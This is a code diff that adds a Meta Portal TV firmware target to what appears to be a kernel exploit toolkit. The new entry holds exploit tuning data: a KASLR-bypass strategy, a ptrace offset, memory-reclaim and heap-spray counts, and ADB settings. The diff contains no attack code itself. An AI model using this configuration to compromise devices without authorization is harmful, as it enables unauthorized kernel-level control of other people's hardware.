@@ -2,7 +2,7 @@
 
 from __future__ import annotations
 
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 import pathlib
 
 
@@ -19,6 +19,9 @@ class PortalTarget:
     product_models: tuple[str, ...] = ()
     stack_route: str = "sendmmsg"
     memstart_strategy: str = "bugreport"
+    kaslr_strategy: str = "simpleperf"
+    proc_uid_user_ids: tuple[int, ...] = ()
+    exploit_env: dict[str, str] = field(default_factory=dict)
     bundled_simpleperf: bool = False
     route_delay_usec: int = 50_000
     proc_uid_sentinel: str = "run_as"
@@ -289,6 +292,45 @@ TARGETS = (
         ),
         presence_full_sensor_width=4032.0,
         ota_packages=("com.facebook.aloha.otaui",),
+    ),
+    PortalTarget(
+        key="portal-tv-ripley-2041515800015050",
+        model="Meta Portal TV",
+        device="ripley",
+        fingerprint=(
+            "Facebook/ripley_prod/ripley:9/PKQ1.191202.001/"
+            "2041515800015050:user/prod-keys"
+        ),
+        kernel="4.4.153+",
+        preload_name="preload-portal-ripley-2041515800015050.so",
+        make_target="portal-ripley-2041515800015050",
+        kaslr_pc_offsets=(),
+        kaslr_strategy="bugreport",
+        product_models=("PortalTV",),
+        stack_route="ptrace",
+        route_delay_usec=0,
+        proc_uid_sentinel="user",
+        proc_uid_user_ids=(10, 11, 12),
+        kgsl_reclaim=True,
+        kgsl_reclaim_allocations=4096,
+        reclaim_pairs=128,
+        reclaim_sends=128,
+        exploit_timeout_seconds=480,
+        recover_watch_result_after_disconnect=True,
+        wireless_adb_file_property="persist.adb.tcp.port",
+        exploit_env={
+            "GHOSTLOCK_SIGSTAMP_SPINS": "0",
+            "GHOSTLOCK_PROC_UID_WARM_MB": "64",
+            "GHOSTLOCK_KGSL_HOLD": "512",
+            "GHOSTLOCK_BUDDY_HOLD_SENDS": "512",
+            "GHOSTLOCK_SPIN_AFTER_ROUTE": "1",
+            "GHOSTLOCK_PTRACE_WAITER_OFF": "0x130",
+            "GHOSTLOCK_PROC_UID_DENSE_EXTENTS": "1",
+            "GHOSTLOCK_PROC_UID_TAIL_MB": "768",
+            "GHOSTLOCK_PTRACE_STAMP_EARLY": "1",
+            "GHOSTLOCK_WAIT_TIMEOUT_RELEASE": "1",
+            "GHOSTLOCK_CONSUME_SWEEPS": "6",
+        },
     ),
 )
 
